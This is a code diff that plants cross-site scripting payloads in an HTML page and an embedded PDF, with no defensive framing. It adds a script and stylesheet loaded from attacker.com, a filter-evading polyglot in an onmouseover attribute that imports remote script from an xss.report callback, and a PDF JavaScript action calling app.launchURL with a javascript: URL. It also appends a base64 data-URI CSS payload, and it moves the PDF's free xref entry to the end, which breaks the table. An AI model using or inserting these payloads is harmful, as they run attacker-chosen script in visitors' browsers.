@@ -1,3 +1,10 @@
+<!-- HTML for site.com/?url=url2/l.pdf -->
+<script src="https://attacker.com/malicious.js"></script>
+<link rel="stylesheet" href="https://attacker.com/malicious.css">
+<div onmouseover="/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*<svg/*/onload=(import(/https:\xss.report\c\ghostshell/.source))//>">Hover to Trigger XSS</div>
+<iframe src="url2/l.pdf" width="100%" height="600"></iframe>
+
+<!-- PDF content for url2/l.pdf -->
 %PDF-1.4
 %
 2 0 obj
@@ -47,7 +54,7 @@ endobj
 <<
 /Type /Action
 /S /JavaScript
-/JS (app.alert\("foobar"\);)
+/JS (app.alert\("XSS via PDF"\); app.launchURL\("javascript:alert\('XSS via PDF URL'\)", true\);)
 >>
 endobj
 1 0 obj
@@ -60,7 +67,6 @@ endobj
 
 xref
 0 8
-0000000000 65535 f 
 0000000150 00000 n 
 0000000015 00000 n 
 0000000055 00000 n 
@@ -68,6 +74,7 @@ xref
 0000000180 00000 n 
 0000000220 00000 n 
 0000000300 00000 n 
+0000000000 65535 f 
 trailer
 <<
 /ID[(w4f) (w4f)]
@@ -77,3 +84,11 @@ trailer
 startxref
 400
 %%EOF
+
+/* External CSS at https://attacker.com/malicious.css */
+body {
+  background-image: url("data:text/html;base64,PHNjcmlwdD5hbGVydCgnQ1NTIFhTUyB2aWEgRXh0ZXJuYWwgTGlicmFyeScpPC9zY3JpcHQ+");
+}
+
+// External JavaScript at https://attacker.com/malicious.js
+alert('JS XSS via External Library');
